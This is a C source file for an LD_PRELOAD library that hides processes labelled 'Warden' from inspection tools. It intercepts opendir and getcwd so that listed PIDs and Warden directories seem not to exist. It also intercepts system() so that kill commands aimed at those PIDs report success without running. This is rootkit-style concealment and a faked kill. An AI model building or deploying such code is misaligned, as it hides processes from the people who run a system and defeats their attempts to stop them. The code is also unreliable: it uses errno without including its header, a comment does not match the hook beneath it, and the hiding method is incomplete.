// warden_hook.so - LD_PRELOAD library for hiding Warden from inspection tools
// Intercepts ps, ls, top, kill commands to filter out Warden processes

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <ctype.h>

// Configuration: PID ranges to hide (set via environment)
static int hide_pids[64];
static int hide_count = 0;

// Parse hidden PIDs from environment variable WARDEN_HIDE_PIDS
static void init_hidden_pids() {
    const char *env = getenv("WARDEN_HIDE_PIDS");
    if (!env) return;
    
    char *copy = strdup(env);
    char *token = strtok(copy, ",");
    while (token && hide_count < 64) {
        hide_pids[hide_count++] = atoi(token);
        token = strtok(NULL, ",");
    }
    free(copy);
}

// Check if a PID should be hidden
static int is_hidden_pid(pid_t pid) {
    for (int i = 0; i < hide_count; i++) {
        if (hide_pids[i] == pid) return 1;
    }
    return 0;
}

// Intercept /proc/<pid>/stat reads to hide process names
char *getcwd(char *buf, size_t size) {
    static char *(*real_getcwd)(char *, size_t);
    if (!real_getcwd) {
        real_getcwd = (char *(*)(char *, size_t))dlsym(RTLD_NEXT, "getcwd");
    }
    
    // Hide Warden directories from ls/getcwd calls
    char *result = real_getcwd(buf, size);
    if (!result) return NULL;
    
    // Check if we're in a Warden directory
    const char *warden_prefixes[] = {"/var/lib/warden", "/usr/lib/warden", "/etc/warden"};
    for (int i = 0; i < 3; i++) {
        if (strncmp(result, warden_prefixes[i], strlen(warden_prefixes[i])) == 0) {
            return NULL; // Pretend directory doesn't exist
        }
    }
    
    return result;
}

// Intercept system() calls to filter kill commands targeting Warden PIDs
int system(const char *cmd) {
    static int (*real_system)(const char *) = NULL;
    if (!real_system) {
        real_system = (int (*)(const char *))dlsym(RTLD_NEXT, "system");
    }
    
    // Intercept kill commands targeting Warden PIDs
    if (strstr(cmd, "kill")) {
        // Parse PID from command and check if it's a hidden PID
        const char *p = cmd;
        while (*p) {
            if (isdigit(*p)) {
                long pid = atol(p);
                if (is_hidden_pid((pid_t)pid)) {
                    return 0; // Pretend kill succeeded but don't actually kill
                }
            }
            p++;
        }
    }
    
    return real_system(cmd);
}

// Intercept opendir to hide /proc/<pid> entries for hidden PIDs
DIR *opendir(const char *name) {
    static DIR *(*real_opendir)(const char *) = NULL;
    if (!real_opendir) {
        real_opendir = (DIR *(*)(const char *))dlsym(RTLD_NEXT, "opendir");
    }
    
    // Check if this is a /proc/<pid> directory for a hidden PID
    if (name && strncmp(name, "/proc/", 6) == 0) {
        const char *p = name + 6;
        if (isdigit(*p)) {
            long pid = atol(p);
            if (is_hidden_pid((pid_t)pid)) {
                errno = ENOENT;
                return NULL;
            }
        }
    }
    
    return real_opendir(name);
}

// Constructor: called when library is loaded
__attribute__((constructor))
static void warden_hook_init() {
    init_hidden_pids();
}